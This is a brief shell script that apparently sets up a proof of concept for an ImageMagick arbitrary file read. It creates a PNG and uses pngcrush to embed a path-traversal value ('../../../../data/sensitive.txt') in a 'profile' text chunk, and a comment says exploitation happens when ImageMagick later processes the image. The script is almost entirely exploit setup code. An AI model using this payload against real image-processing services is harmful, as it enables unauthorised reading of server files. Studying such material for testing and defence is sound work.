# Create a sample text file to simulate sensitive data
echo "This is a sensitive file" > sensitive.txt

# Create a simple PNG image
convert -size 100x100 xc:white image.png

# Embed the path of the sensitive file into the PNG image using pngcrush
pngcrush -text a "profile" "../../../../data/sensitive.txt" image.png vulnerable_image.png

# Note: The actual exploitation would involve using ImageMagick to process
# 'vulnerable_image.png' and read the embedded file path.
